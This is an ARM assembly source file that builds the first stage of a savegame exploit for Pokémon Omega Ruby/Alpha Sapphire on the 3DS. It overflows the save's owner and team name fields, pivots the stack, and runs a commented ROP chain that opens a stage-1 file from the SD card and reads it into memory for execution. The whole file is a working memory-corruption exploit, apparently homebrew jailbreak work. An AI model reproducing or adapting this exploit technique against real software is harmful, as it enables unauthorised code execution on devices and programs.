.nds

.include "oras_constants.s"
.include "oras_macros.s"

.create "../build/rop_stage0.bin",ORAS_SAVE_OWNERNAME_PTR

; PIVOT 
.halfword 0x0000 ; keep aligned because of ldm r4 in Read for dest and size
second_jump:
	.word second_jump ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PIVOT
	.word ORAS_PIVOT ; move r2 to sp 
				 ; then load the value stored at r0 in r2, so second_jump is stored in r2
				 ; then load the value stored at r2+0x10 in r2, so ROP_ORAS_NOP is stored in r2
				 ; then it jumps to r2
	.word ROP_ORAS_POP_R3PC ; unused by pivot, used later to jump to next gadget after mov r2, #0
	
	; NOT PIVOT
	read_dest_and_size:
		.word sp_at_end+0xC ; unused by pivot, used to store the location where the stage1 is copied
							; we copy stage1 where FSFILE_Read pop pc (pop {r4-r6, pc})
	
	;PIVOT
	.word ROP_ORAS_NOP ; called after stack pivot, overwritten later by getsize to store the size of stage1
	
	;NOT PIVOT
	.word ORAS_FSFILE_READ+0xC ; unused by pivot, used later to finally jump to Read with ldr r12, [r0, #8]; mov r0, r6; blx r12; with r0=read_dest_and_size
							   ; +0xC to avoid push, add r4 and mov r5 (manually set)
	
.fill (ORAS_SAVE_OWNERNAME_PTR+0x1A - .), 0x00 ; owner name is 0x1A bytes long

rop_file:
	.ascii "/basehaxx/", ORAS_VERSION, "/rop.bin", 0 ; rop stage1 file path
rop_file_end:

.fill (ORAS_SAVE_OWNERNAME_PTR+0x66 - .), 0xDA ; overflow team name

.word second_jump ; the game dereference this => see second_jump

first_jump:
	.word first_jump ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
	.word ORAS_PREPIVOT ; 1st jump, allows us to load the value stored at r0+0x8 in r2, when we jump r0=first_jump so rop_start is loaded in r2
	.word rop_start ; the address in RAM where the rop start

;ROP

rop_start:
	; prepare 4 first args of openfiledirectly
	.word ROP_ORAS_MOV_R2_0_LDR_R12R0_8_MOV_R0R7_BLX_R12 ; mov r2, #0 => transaction = 0, r0 is still equal to second_jump so it jumps to ROP_ORAS_POP_R3PC
		.word 0x9 ; archiveID (SDMC)
	
	.word ROP_ORAS_POP_R0PC 
		.word ORAS_FSUSER_HANDLE
		
	.word ORAS_FSUSER_OPENFILEDIRECTLY+0x4
	sp_before_openfile:
	; openfiledirectly sp+0x10 before pop, skiped by openfiledirectly but used later
	
		.word ROP_ORAS_POP_R0PC ; executed after the pivot to sp_before_openfile
			.word file_handle_out ; address where file handle is stored, used by openfiledirectly, popped to r0 for getsize
		.word ORAS_FSFILE_GETSIZE+0x4 ; 0x4 for mov r5, r1 and to avoid push 
			.word read_dest_and_size ; popped to r4 by getsize, used by Read to get the size and the address where stage1 should be copied
	
	; openfiledirectly pop registers from r4 to pc
	
			.word LINEAR_BUFFER ; unused for getsize, popped to r5 by getsize, used by Read store bytes_read
			.word file_handle_out ; unused for getsize, popped to r6 by getsize, later moved to r0 for Read
		.word ROP_ORAS_POP_R0PC ; unused for getsize, executed after getsize
			.word tricky_jump_ptr-0x28 ; unused for getsize, prepare the next jump (ldr r12, [r0, #28] ... blx r12)
		.word ROP_ORAS_MOV_R3_0_MOV_R2R3_LDR_R12R0_28_MOV_R0R4_BLX_R12 ; unused for getsize, executed after the previous pop r0
																	   ; set r3=0, r2=r3=0, r0=r4=read_dest_and_size and jump to the address stored at tricky_jump_ptr
		sp_at_end:
		file_handle_out:
		.word 0xDEADC0DE ; unused for getsize, just used to store file handle and pop it to r9
		
		.word 0x100000000 - sp_after_openfile + sp_before_openfile ; used for "pivot" back to sp_before_openfile, moved to r3, then we have sp + r3 > 0xFFFFFFFF and so sp+r3=sp_before_openfile
		.word read_dest_and_size+0x4 ; used by getsize, moved to r1, pointer to location where stage1 size is stored
		.word ROP_ORAS_POP_R3_ADD_SP_SPR3_POP_PC+0x4 ; after multiple mov instructions we jump to it => "pivot" back to sp_before_openfile
	
	.word ROP_ORAS_MOV_R3R10_MOV_R2R9_MOV_R1R11_MOVR0R6_BLX_R12 ; r3=r10, r2=r9 (don't care of r2 for getsize), r1=r11, r0=r6 (modified with next gadget) and the sp_before_openfile "pivot"
	sp_after_openfile:
	
	; openfiledirectly args
	; all these args can potentially be overwritten after openfiledirectly call and before Read call
	
		.word 0x1 ; archivePathType (EMPTY)
		.word empty_string ; archivePathDataPointer
		.word 0x1 ; archivePathSize
		.word 0x3 ; filePathType (ASCII)
		.word rop_file ; filePathDataPointer
		.word rop_file_end - rop_file ; filePathSize
		.word 0x1 ; openFlags (READ)
		empty_string:
		.word 0x0 ; attributes
		
	tricky_jump_ptr:
		.word ROP_ORAS_LDR_R12R0_8_MOV_R0R6_BLX_R12 ; r0=r6=file_handle_out and jump to the value stored at read_dest_and_size+0x8 => FSFILE_Read+0xC
		
.close